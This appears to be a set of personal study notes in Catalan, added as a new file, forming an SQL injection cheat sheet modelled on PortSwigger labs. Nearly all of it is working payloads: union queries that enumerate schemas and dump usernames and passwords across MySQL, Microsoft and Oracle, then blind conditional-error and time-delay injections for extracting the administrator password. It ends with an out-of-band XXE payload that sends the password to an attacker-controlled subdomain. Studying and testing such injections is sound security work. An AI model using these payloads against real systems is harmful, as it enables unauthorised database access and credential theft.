@@ -1,0 +1,134 @@
+sql injection
+
+portswigger sql injection cheat sheet
+
+MYSQL or MICROSOFT-----------------------------------------------------------------------------------------------------------------------
+coment: -- -
+concat()
+grup_concat(users, ':'(0x3a) ,password) concatenar respostas en una sola sortida de info
+users|| ':' ||password
+
+'or 1=1-- - (resultat tru, dump information)
+'union ( uneix els resultats en la columna indicada)
+'union select NULL,@@version-- - (verure la versio de la database amb mysql)
+
+listar db: 'union select schema_name,(2/NULL) from information_schema.schemata-- -
+
+		'UNION SELECT table_name, NULL FROM information_schema.tables--
+
+
+listar tables: 'UNION SELECT table_name, NULL FROM information_schema.tables where table_schema = '(la db)'-- -
+
+
+		'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='(table name)'-- -
+
+listar columnas: 'union select column_name,NULL from information_schema.columns where table_schema = '(la db)' and table_name = '(tabla)'-- -
+
+listar data: 'union select password,username from users-- -
+
+ORACLE------------------------------------------------------------------------------------------------------------------------------
+
+'union select NULL,NULL from dual-- - (has de apuntar una base de datos per saber les columnes que te)
+'union select banner,NULL from v$version-- - (per veure la versio de la database)
+
+'union select table_name, NULL from all_tables-- - (dump de informacio de totes les taules)
+'union select owner, NULL from all_tables-- - (veus qui son els owners de les taules) --> 'union select table_name, NULL from all_tables where owner = 'alex'-- -
+'union select NULL, column_name from all_tab_columns where table_name = 'users....'-- -
+'union select NULL, users||':'||passworsd from usernames-- -
+
+
+BLIND SQL INJECTION----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+*MYSQL/MICROSOFT-------------------------------------conditional response
+
+'and (select substring(password,1,1) from users where username ='administrator')='a
+
+*ORACLE-------------------------------------conditional error
+'||(select '' from dual)||'
+
+'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>= 20)||'
+
+-si lenght de la password es correcta et donara un 500 internal error
+-si es correcta la lenght de la password et donara un 200 OK
+-perque el que pasa que primer executa from 'from users where username='administrator' and length(password)>= 20' i si es correcte aquesta consulta pasa al 1=1, que com aixo es true et da el to_char(1/0) que es syntax error, per tant et dona el 500 internal error
+
+'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>= 20)||'
+
+-aqui fem el mateix, pero en comptes de 1=1 probem el primer caracter de la contrasenya, per tant, quan encertem el primer caracter de la contrasenya sortira el 500 internal error, i quan no el 200 OK
+
+*MYSQL-------------------------------------conditional visible error
+
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+-treiem la coockie per tenis mes marge de maniobra, aquest query mostrara el firts username de la taula users
+
+-en aquest cas: ERROR: invalid input syntax for type integer: "administrator"
+
+TrackingId=' AND 1=CAST((SELECT password from users limit 1) AS int)-- -
+
+-ara que sabem que el admin es el primer user de la taula, mirem las passwords i aixi mostrem la contrasenya de el username , que es el admin.
+
+ERROR: invalid input syntax for type integer: "xxxxxxxxxxxxxxxxxxx"
+
+
+*MYSQL-------------------------------------Blind SQL injection with time delays
+
+' and sleep(5)-- -
+
+- si la web tarda 5 segons en respondre sabem que es una injeccio basada en temps, i que estem a mysql
+
+*POSTGRESQL-------------------------------------Blind SQL injection with time delays
+
+' ||pg_sleep(5)-- -
+
+- si la web tarda 5 segons en respondre sabem que es una injeccio basada en temps, i que estem a postgresql
+
+'||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')-- -
+
+- validem que el usuari 'administrator' existeix, si existeix 1=1(true) llavors pg_sleep(10), la web tardara en respondre 10 segons si el username 'administrator' existeix, 
+sino existeix tardara 0 segons en respondre
+
+
+'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)>=20)-- -
+
+- amb el mateix principi validem la llargada de la contrasenya
+
+'||(select case when substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -
+
+- aixi podriem arribar a filtrar la contrasenya, pero es modifica per el script amb python.
+
+*POSTGRESQL-------------------------------------Blind SQL injection with out-of-band interaction
+
+Aquest es fa per el dns, en quest cas es el de postgresql, pero al chet sheet de port swigger, esta el codic de leak x dns per mysql i per altres, es requeiex un subdomini de una pagina web per leakejar la password
+
+'||()-- -
+
+TrakingId=
+' ||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from useres where username='administrator')||'.AQUI VA EL SUBDOMINI/"> %remote;]>'),'/l') FROM dual)-- -
+
+- de aquesta manera seleccionem la contrasenya i la enviaem com a nom de el subnomini
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
